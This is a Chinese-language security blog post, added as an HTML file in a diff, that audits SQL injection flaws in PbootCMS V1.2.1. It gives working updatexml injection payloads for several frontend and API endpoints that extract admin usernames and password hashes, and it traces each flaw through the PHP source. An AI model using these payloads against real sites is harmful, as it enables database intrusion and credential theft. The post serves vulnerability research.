@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PbootCMS sql注入0x01 前台home模块注入漏洞0x01.1 在线留言处insert sql注入0x01.1.2 漏洞演示注：我本地测试的所以我把验证验证码那一步关闭了&#x3D;-&#x3D;，实战中请自己加上验证码  url:http:&#x2F;&#x2F;127.0.0.1&#x2F;cms&#x2F;PbootCMS-V1.2.1&#x2F;index.php&#x2F;Message&#x2F;add post:     contacts[content&#96;,&#96;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/PbootCMS/PbootCMS%20sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="PbootCMS sql注入0x01 前台home模块注入漏洞0x01.1 在线留言处insert sql注入0x01.1.2 漏洞演示注：我本地测试的所以我把验证验证码那一步关闭了&#x3D;-&#x3D;，实战中请自己加上验证码  url:http:&#x2F;&#x2F;127.0.0.1&#x2F;cms&#x2F;PbootCMS-V1.2.1&#x2F;index.php&#x2F;Message&#x2F;add post:     contacts[content&#96;,&#96;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId37.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId41.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId44.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId50.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId53.png">
+<meta property="article:published_time" content="2022-07-08T06:26:00.902Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-PbootCMS/PbootCMS sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PbootCMS/PbootCMS%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.902Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PbootCMS-sql注入"><a href="#PbootCMS-sql注入" class="headerlink" title="PbootCMS sql注入"></a>PbootCMS sql注入</h1><h2 id="0x01-前台home模块注入漏洞"><a href="#0x01-前台home模块注入漏洞" class="headerlink" title="0x01 前台home模块注入漏洞"></a>0x01 前台home模块注入漏洞</h2><h2 id="0x01-1-在线留言处insert-sql注入"><a href="#0x01-1-在线留言处insert-sql注入" class="headerlink" title="0x01.1 在线留言处insert sql注入"></a>0x01.1 在线留言处insert sql注入</h2><h3 id="0x01-1-2-漏洞演示"><a href="#0x01-1-2-漏洞演示" class="headerlink" title="0x01.1.2 漏洞演示"></a>0x01.1.2 漏洞演示</h3><p>注：我本地测试的所以我把验证验证码那一步关闭了=-=，实战中请自己加上验证码</p>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId24.png"></p>
+<pre><code>url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Message/add
+post:
+    contacts[content`,`create_time`,`update_time`) VALUES (&#39;1&#39;, &#39;1&#39; ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111
+    content = 1111
+    mobile = 1111
+</code></pre>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
+<h3 id="0x01-1-2-漏洞解读"><a href="#0x01-1-2-漏洞解读" class="headerlink" title="0x01.1.2 漏洞解读"></a>0x01.1.2 漏洞解读</h3><p>路径：PbootCMS-V1.2.1\apps\home\controller\MessageController.php<br>方法：add(</p>
+<pre><code>// 留言新增
+    public function add()
+    &#123;
+        if ($_POST) &#123;
+
+            if (time() - session(&#39;lastsub&#39;) &lt; 10) &#123;
+                alert_back(&#39;您提交太频繁了，请稍后再试！&#39;);
+            &#125;
+
+            // 验证码验证
+            $checkcode = post(&#39;checkcode&#39;);
+            if ($this-&gt;config(&#39;message_check_code&#39;)) &#123;
+                // if (! $checkcode) &#123;
+                //     alert_back(&#39;验证码不能为空！&#39;);
+                // &#125;
+
+                if ($checkcode != session(&#39;checkcode&#39;)) &#123;
+                    alert_back(&#39;验证码错误！&#39;);
+                &#125;
+            &#125;
+
+            // 读取字段
+            if (! $form = $this-&gt;model-&gt;getFormField(1)) &#123;
+                alert_back(&#39;留言表单不存在任何字段，请核对后重试！&#39;);
+            &#125;
+
+            // 接收数据
+            $mail_body = &#39;&#39;;
+            foreach ($form as $value) &#123;
+                $field_data = post($value-&gt;name);
+                if (is_array($field_data)) &#123; // 如果是多选等情况时转换
+                    $field_data = implode(&#39;,&#39;, $field_data);
+                &#125;
+                if ($value-&gt;required &amp;&amp; ! $field_data) &#123;
+                    alert_back($value-&gt;description . &#39;不能为空！&#39;);
+                &#125; else &#123;
+                    $data[$value-&gt;name] = post($value-&gt;name);
+                    $mail_body .= $value-&gt;description . &#39;：&#39; . post($value-&gt;name) . &#39;&lt;br&gt;&#39;;
+                &#125;
+            &#125;
+
+            // 设置额外数据
+            if ($data) &#123;
+                $data[&#39;acode&#39;] = session(&#39;lg&#39;);
+                $data[&#39;user_ip&#39;] = ip2long(get_user_ip());
+                $data[&#39;user_os&#39;] = get_user_os();
+                $data[&#39;user_bs&#39;] = get_user_bs();
+                $data[&#39;recontent&#39;] = &#39;&#39;;
+                $data[&#39;status&#39;] = 0;
+                $data[&#39;create_user&#39;] = &#39;guest&#39;;
+                $data[&#39;update_user&#39;] = &#39;guest&#39;;
+            &#125;
+
+            if ($this-&gt;model-&gt;addMessage($data)) &#123;
+                session(&#39;lastsub&#39;, time()); // 记录最后提交时间
+                $this-&gt;log(&#39;留言提交成功！&#39;);
+                if ($this-&gt;config(&#39;message_send_mail&#39;) &amp;&amp; $this-&gt;config(&#39;message_send_to&#39;)) &#123;
+                    $mail_subject = &quot;【PbootCMS】您有新的表单数据，请注意查收！&quot;;
+                    $mail_body .= &#39;&lt;br&gt;来自网站&#39; . get_http_url() . &#39;（&#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39;）&#39;;
+                    sendmail($this-&gt;config(), $this-&gt;config(&#39;message_send_to&#39;), $mail_subject, $mail_body);
+                &#125;
+                alert_location(&#39;提交成功！&#39;, &#39;-1&#39;);
+            &#125; else &#123;
+                $this-&gt;log(&#39;留言提交失败！&#39;);
+                alert_back(&#39;提交失败！&#39;);
+            &#125;
+        &#125; else &#123;
+            error(&#39;提交失败，请使用POST方式提交！&#39;);
+        &#125;
+    &#125;
+</code></pre>
+<p>可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部<br>POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组</p>
+<pre><code>然后就会带入 $this-&gt;model-&gt;addMessage(data) 执行语句
+</code></pre>
+<p>路径：PbootCMS-V1.2.1\apps\home\model\ParserModel.php<br>方法：addMessage(</p>
+<pre><code>// 新增留言
+public function addMessage($data)
+&#123;
+    return parent::table(&#39;ay_message&#39;)-&gt;autoTime()-&gt;insert($data);
+&#125;
+</code></pre>
+<p>根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key<br>带入数据库查询引发注入</p>
+<h2 id="0x01-2-免费通话insert-sql注入"><a href="#0x01-2-免费通话insert-sql注入" class="headerlink" title="0x01.2 免费通话insert sql注入"></a>0x01.2 免费通话insert sql注入</h2><p>注：本地测试的时候，这个地方的注入需要后台添加一条数据才能注！真实环境的话，开放了这个功能直接抓包即可<br>进入后台</p>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId30.png"></p>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId31.png"></p>
+<h3 id="0x08-2-1-漏洞演示"><a href="#0x08-2-1-漏洞演示" class="headerlink" title="0x08.2.1 漏洞演示"></a>0x08.2.1 漏洞演示</h3><p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId33.png"></p>
+<pre><code>url：http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Form/add?fcode=2
+post：
+  tel[tel`) VALUES ( 1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111
+</code></pre>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId34.png"></p>
+<h3 id="0x08-2-2-漏洞解读"><a href="#0x08-2-2-漏洞解读" class="headerlink" title="0x08.2.2 漏洞解读"></a>0x08.2.2 漏洞解读</h3><p>路径：PbootCMS-V1.2.1\apps\home\controller\FormController.php<br>方法：add(</p>
+<pre><code>// 表单提交
+    public function add()
+    &#123;
+        if ($_POST) &#123;
+
+            if (time() - session(&#39;lastsub&#39;) &lt; 10) &#123;
+                alert_back(&#39;您提交太频繁了，请稍后再试！&#39;);
+            &#125;
+
+            if (! $fcode = get(&#39;fcode&#39;, &#39;var&#39;)) &#123;
+                alert_back(&#39;传递的表单编码有误！&#39;);
+            &#125;
+
+            if ($fcode == 1) &#123;
+                alert_back(&#39;表单提交地址有误，留言提交请使用留言专用地址!&#39;);
+            &#125;
+
+            // 验证码验证
+            /*
+             * $checkcode = post(&#39;checkcode&#39;);
+             * if ($this-&gt;config(&#39;message_check_code&#39;)) &#123;
+             * if (! $checkcode) &#123;
+             * alert_back(&#39;验证码不能为空！&#39;);
+             * &#125;
+             * if ($checkcode != session(&#39;checkcode&#39;)) &#123;
+             * alert_back(&#39;验证码错误！&#39;);
+             * &#125;
+             * &#125;
+             */
+
+            // 读取字段
+            if (! $form = $this-&gt;model-&gt;getFormField($fcode)) &#123;
+                alert_back(&#39;接收表单不存在任何字段，请核对后重试！&#39;);
+            &#125;
+
+            // 接收数据
+            $mail_body = &#39;&#39;;
+            foreach ($form as $value) &#123;
+                $field_data = post($value-&gt;name);
+                if (is_array($field_data)) &#123; // 如果是多选等情况时转换
+                    $field_data = implode(&#39;,&#39;, $field_data);
+                &#125;
+                if ($value-&gt;required &amp;&amp; ! $field_data) &#123;
+                    alert_back($value-&gt;description . &#39;不能为空！&#39;);
+                &#125; else &#123;
+                    $data[$value-&gt;name] = post($value-&gt;name);
+                    $mail_body .= $value-&gt;description . &#39;：&#39; . post($value-&gt;name) . &#39;&lt;br&gt;&#39;;
+                &#125;
+            &#125;
+
+            // 设置创建时间
+            if ($data) &#123;
+                $data[&#39;create_time&#39;] = get_datetime();
+            &#125;
+
+            // 写入数据
+            if ($this-&gt;model-&gt;addForm($value-&gt;table_name, $data)) &#123;
+                session(&#39;lastsub&#39;, time()); // 记录最后提交时间
+                $this-&gt;log(&#39;提交表单数据成功！&#39;);
+                if ($this-&gt;config(&#39;message_send_mail&#39;) &amp;&amp; $this-&gt;config(&#39;message_send_to&#39;)) &#123;
+                    $mail_subject = &quot;【PbootCMS】您有新的表单数据，请注意查收！&quot;;
+                    $mail_body .= &#39;&lt;br&gt;来自网站&#39; . get_http_url() . &#39;（&#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39;）&#39;;
+                    sendmail($this-&gt;config(), $this-&gt;config(&#39;message_send_to&#39;), $mail_subject, $mail_body);
+                &#125;
+                alert_location(&#39;提交成功！&#39;, &#39;-1&#39;);
+            &#125; else &#123;
+                $this-&gt;log(&#39;提交表单数据失败！&#39;);
+                alert_back(&#39;提交失败！&#39;);
+            &#125;
+        &#125; else &#123;
+            error(&#39;提交失败，请使用POST方式提交！&#39;);
+        &#125;
+    &#125;
+</code></pre>
+<p>可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部<br>POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组</p>
+<pre><code>然后就会带入 $this-&gt;model-&gt;addForm($value-&gt;table_name, $data) 执行语句
+</code></pre>
+<p>路径：PbootCMS-V1.2.1\apps\home\model\ParserModel.php</p>
+<pre><code>public function addForm($table, $data)
+&#123;
+    return parent::table($table)-&gt;insert($data);
+&#125;
+</code></pre>
+<p>根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key<br>带入数据库查询引发注入.</p>
+<h2 id="0X01-3-前台首页注入"><a href="#0X01-3-前台首页注入" class="headerlink" title="0X01.3 前台首页注入"></a>0X01.3 前台首页注入</h2><p>0x08.3.1 漏洞演示 url:</p>
+<pre><code>http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
+</code></pre>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId37.png"></p>
+<h3 id="0x01-3-2-漏洞解读"><a href="#0x01-3-2-漏洞解读" class="headerlink" title="0x01.3.2 漏洞解读"></a>0x01.3.2 漏洞解读</h3><p>文件地址：PbootCMS-V1.2.1\apps\home\controller\ParserController.php<br>方法：index(</p>
+<pre><code>// 首页 骚操作 注入
+    // parserAfter -&gt; parserSpecifyListLabel
+    public function index()
+    &#123;
+        $content = parent::parser(&#39;index.html&#39;); // 框架标签解析
+        $content = $this-&gt;parser-&gt;parserBefore($content); // CMS公共标签前置解析
+        $content = $this-&gt;parser-&gt;parserPositionLabel($content, - 1, &#39;首页&#39;, SITE_DIR . &#39;/&#39;); // CMS当前位置标签解析
+        $content = $this-&gt;parser-&gt;parserSpecialPageSortLabel($content, 0, &#39;&#39;, SITE_DIR . &#39;/&#39;); // 解析分类标签
+        $content = $this-&gt;parser-&gt;parserAfter($content); // CMS公共标签后置解析
+        $this-&gt;cache($content, true);
+    &#125;
+</code></pre>
+<p>文件地址：apps\home\controller\ParserController.php<br>方法：parserAfter()</p>
+<pre><code>跟进 $content = $this-&gt;parser-&gt;parserAfter($content); 这个方法
+// 解析全局后置公共标签
+    public function parserAfter($content)
+    &#123;
+        ...
+        $content = $this-&gt;parserSpecifyListLabel($content); // 指定列表
+        return $content;
+    &#125;
+</code></pre>
+<p>方法：parserSpecifyListLabel(</p>
+<pre><code>进入以后 查看调用了 $content = $this-&gt;parserSpecifyListLabel($content); 方法
+// 解析指定分类列表标签
+public function parserSpecifyListLabel($content)
+&#123;
+  ...
+  // 数据筛选 骚操作注入
+  $where2 = array();
+  foreach ($_GET as $key =&gt; $value) &#123;
+    if (substr($key, 0, 4) == &#39;ext_&#39;) &#123; // 其他字段不加入
+      $where2[$key] = get($key);
+    &#125;
+  &#125;
+  ...
+  // 读取数据
+  if ($page) &#123;
+    $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2);
+  &#125; else &#123;
+    $data = $this-&gt;model-&gt;getSpecifyList($scode, $num, $order, $where1, $where2);
+  &#125;
+&#125;
+</code></pre>
+<p>这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。<br>这里接收了外部了外部所有的get参数然后判断了开头的前4个字符是否 ext_<br>开头，如果符合就直接拼接进入$where2这个数组<br>然后带入数据库进行getList方法与getSpecifyList查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入</p>
+<h2 id="0x08-4-前台搜索框注入"><a href="#0x08-4-前台搜索框注入" class="headerlink" title="0x08.4 前台搜索框注入"></a>0x08.4 前台搜索框注入</h2><h3 id="0x08-4-1-漏洞利用"><a href="#0x08-4-1-漏洞利用" class="headerlink" title="0x08.4.1 漏洞利用"></a>0x08.4.1 漏洞利用</h3><pre><code>url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Search/index?keyword=aaaa&amp;updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
+</code></pre>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId41.png"></p>
+<h3 id="0x08-4-2-漏洞讲解"><a href="#0x08-4-2-漏洞讲解" class="headerlink" title="0x08.4.2 漏洞讲解"></a>0x08.4.2 漏洞讲解</h3><p>文件地址：PbootCMS-V1.2.1\apps\home\controller\SearchController.php<br>方法：index()</p>
+<pre><code>// 骚操作 注入
+    // parserSearchLabel
+    public function index()
+    &#123;
+        $content = parent::parser(&#39;search.html&#39;); // 框架标签解析
+        $content = $this-&gt;parser-&gt;parserBefore($content); // CMS公共标签前置解析
+        $content = $this-&gt;parser-&gt;parserPositionLabel($content, 0, &#39;搜索&#39;, url(&#39;/home/Search/index&#39;)); // CMS当前位置标签解析
+        $content = $this-&gt;parser-&gt;parserSpecialPageSortLabel($content, 0, &#39;搜索结果&#39;, url(&#39;/home/Search/index&#39;)); // 解析分类标签
+        $content = $this-&gt;parser-&gt;parserSearchLabel($content); // 搜索结果标签
+        $content = $this-&gt;parser-&gt;parserAfter($content); // CMS公共标签后置解析
+        $this-&gt;cache($content, true);
+    &#125;
+</code></pre>
+<p>文件地址：apps\home\controller\ParserController.php<br>方法：parserSearchLabel(</p>
+<pre><code>进入以后 查看调用了 $content = $this-&gt;parser-&gt;parserSearchLabel($content);  方法
+// 解析内容搜索结果标签
+public function parserSearchLabel($content)
+&#123;
+  ...
+  foreach ($_GET as $key =&gt; $value) &#123;
+    if (! ! $value = get($key, &#39;vars&#39;)) &#123;
+      $where2[$key] = $value;
+    &#125;
+  &#125;
+  ...
+  // 读取数据
+  if (! $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2, $fuzzy)) &#123;
+    $content = str_replace($matches[0][$i], &#39;&#39;, $content);
+    continue;
+  &#125;
+&#125;
+</code></pre>
+<p>这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。<br>这里接收了外部了外部所有的get参数然后就直接拼接进入$where2这个数组<br>然后带入数据库进行getList方法查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入</p>
+<h2 id="0x10-api模块注入"><a href="#0x10-api模块注入" class="headerlink" title="0x10 api模块注入"></a>0x10 api模块注入</h2><p>api模块的注入需要后端开启api功能，并且获得 api_appid 与 api_secret<br>才能注入。 或是说 开启了api功能并且关闭了API强制认证 这样也可以注入<br>所以较鸡助</p>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId44.jpg"></p>
+<h2 id="0x10-1-接口注入一"><a href="#0x10-1-接口注入一" class="headerlink" title="0x10.1 接口注入一"></a>0x10.1 接口注入一</h2><h3 id="0x10-1-1-漏洞演示"><a href="#0x10-1-1-漏洞演示" class="headerlink" title="0x10.1.1 漏洞演示"></a>0x10.1.1 漏洞演示</h3><pre><code>url:http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/search?1%3D1)and(updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1))--=1
+post：
+    11=11
+</code></pre>
+<p>一定要post 要跑空post才能进流程</p>
+<p>因为系统中会把 “空格”转为”_“ 所以使用/**/绕过即可</p>
+<h3 id="0x10-1-2-漏洞讲解"><a href="#0x10-1-2-漏洞讲解" class="headerlink" title="0x10.1.2 漏洞讲解"></a>0x10.1.2 漏洞讲解</h3><p>路径：apps\api\controller\CmsController.php 方法：search(<br>这里我把漏洞触发点发出来我们主要讲讲他即可</p>
+<pre><code>// 数据接收
+foreach ($_GET as $key =&gt; $value) &#123;
+  if (! ! $value = get($key, &#39;vars&#39;)) &#123;
+    $where[$key] = $value;
+  &#125;
+&#125;
+$data = $this-&gt;model-&gt;getList($acode, $scode, $num, $order, $where, $fuzzy);
+</code></pre>
+<p>从代码中看他会收集外部所有的 $_GET 带入 getList 进行入库查询 value<br>是我们无法控制所以无法注入的，可是key是我们可控制可注入的！！！跟进<br>getList方法 路径：PbootCMS-V1.2.1\apps\api\model\CmsModel.php<br>function getList(</p>
+<pre><code>// 列表内容
+    public function getList($acode, $scode, $num, $order, $where = array(), $fuzzy = true)
+    &#123;
+        ...
+        // 筛选条件支持模糊匹配
+        return parent::table(&#39;ay_content a&#39;)-&gt;field($fields)
+            -&gt;where($where1, &#39;OR&#39;)
+            -&gt;where($where2)
+            -&gt;where($where, &#39;AND&#39;, &#39;AND&#39;, $fuzzy)
+            -&gt;join($join)
+            -&gt;order($order)
+            -&gt;page(1, $num)
+            -&gt;decode()
+            -&gt;select();
+    &#125;
+</code></pre>
+<p>这里我把关键代码放出来了，可以看到接收$where以后直接仍进了数据库进行操作造成了注入</p>
+<h2 id="0x10-2-接口注入二"><a href="#0x10-2-接口注入二" class="headerlink" title="0x10.2 接口注入二"></a>0x10.2 接口注入二</h2><h3 id="0x10-2-1-漏洞利用"><a href="#0x10-2-1-漏洞利用" class="headerlink" title="0x10.2.1 漏洞利用"></a>0x10.2.1 漏洞利用</h3><pre><code>url：http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addmsg
+post:
+    contacts[contentl`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111
+    mobile = 111
+    content = 111
+</code></pre>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId50.png"></p>
+<p>0x10.2.2 漏洞讲解<br>文件：PbootCMS-V1.2.1\apps\api\controller\CmsController.php<br>方法：addmsg(</p>
+<pre><code>// 新增留言   注入
+    public function addmsg()
+    &#123;
+        if ($_POST) &#123;
+
+            // 读取字段
+            if (! $form = $this-&gt;model-&gt;getFormField(1)) &#123;
+                json(0, &#39;接收表单不存在任何字段，请核对后重试！&#39;);
+            &#125;
+
+            // 接收数据
+            $mail_body = &#39;&#39;;
+            foreach ($form as $value) &#123;
+                $field_data = post($value-&gt;name);
+                if ($value-&gt;required &amp;&amp; ! $field_data) &#123;
+                    json(0, $value-&gt;description . &#39;不能为空！&#39;);
+                &#125; else &#123;
+                    $data[$value-&gt;name] = post($value-&gt;name);
+                    $mail_body .= $value-&gt;description . &#39;：&#39; . post($value-&gt;name) . &#39;&lt;br&gt;&#39;;
+                &#125;
+            &#125;
+
+            // 设置其他字段
+            if ($data) &#123;
+                $data[&#39;acode&#39;] = get(&#39;acode&#39;, &#39;var&#39;) ?: $this-&gt;lg;
+                $data[&#39;user_ip&#39;] = ip2long(get_user_ip());
+                $data[&#39;user_os&#39;] = get_user_os();
+                $data[&#39;user_bs&#39;] = get_user_bs();
+                $data[&#39;recontent&#39;] = &#39;&#39;;
+                $data[&#39;status&#39;] = 0;
+                $data[&#39;create_user&#39;] = &#39;api&#39;;
+                $data[&#39;update_user&#39;] = &#39;api&#39;;
+            &#125;
+
+            // 写入数据
+            if ($this-&gt;model-&gt;addMessage($value-&gt;table_name, $data)) &#123;
+                $this-&gt;log(&#39;API提交表单数据成功！&#39;);
+                if ($this-&gt;config(&#39;message_send_mail&#39;) &amp;&amp; $this-&gt;config(&#39;message_send_to&#39;)) &#123;
+                    $mail_subject = &quot;【PbootCMS】您有新的表单数据，请注意查收！&quot;;
+                    $mail_body .= &#39;&lt;br&gt;来自网站&#39; . get_http_url() . &#39;（&#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39;）&#39;;
+                    sendmail($this-&gt;config(), $this-&gt;config(&#39;message_send_to&#39;), $mail_subject, $mail_body);
+                &#125;
+                json(1, &#39;表单提交成功！&#39;);
+            &#125; else &#123;
+                $this-&gt;log(&#39;API提交表单数据失败！&#39;);
+                json(0, &#39;表单提交失败！&#39;);
+            &#125;
+        &#125; else &#123;
+            json(0, &#39;表单提交失败，请使用POST方式提交！&#39;);
+        &#125;
+    &#125;
+</code></pre>
+<p>可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部<br>POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组</p>
+<pre><code>然后就会带入 $this-&gt;model-&gt;addMessage(data) 执行语句
+</code></pre>
+<p>文件：PbootCMS-V1.2.1\apps\api\model\CmsModel.php 函数：addMessage(</p>
+<pre><code>// 新增留言
+    public function addMessage($table, $data)
+    &#123;
+        return parent::table(&#39;ay_message&#39;)-&gt;autoTime()-&gt;insert($data);
+    &#125;
+</code></pre>
+<p>根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key<br>带入数据库查询引发注入</p>
+<h2 id="0x10-3-接口注入三"><a href="#0x10-3-接口注入三" class="headerlink" title="0x10.3 接口注入三"></a>0x10.3 接口注入三</h2><h3 id="0x10-3-1-漏洞利用"><a href="#0x10-3-1-漏洞利用" class="headerlink" title="0x10.3.1 漏洞利用"></a>0x10.3.1 漏洞利用</h3><pre><code>url：http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addform?fcode=1
+post:
+    contacts[content`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111
+    mobile = 111
+    content = 123
+</code></pre>
+<p><img src="/resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId53.png"></p>
+<p>0x10.3.2 漏洞讲解</p>
+<pre><code>// 表单提交  注入
+    public function addform()
+    &#123;
+        if ($_POST) &#123;
+
+            if (! $fcode = get(&#39;fcode&#39;, &#39;var&#39;)) &#123;
+                json(0, &#39;传递的表单编码fcode有误！&#39;);
+            &#125;
+
+            // 读取字段
+            if (! $form = $this-&gt;model-&gt;getFormField($fcode)) &#123;
+                json(0, &#39;接收表单不存在任何字段，请核对后重试！&#39;);
+            &#125;
+
+            // 接收数据
+            $mail_body = &#39;&#39;;
+            foreach ($form as $value) &#123;
+                $field_data = post($value-&gt;name);
+                if ($value-&gt;required &amp;&amp; ! $field_data) &#123;
+                    json(0, $value-&gt;description . &#39;不能为空！&#39;);
+                &#125; else &#123;
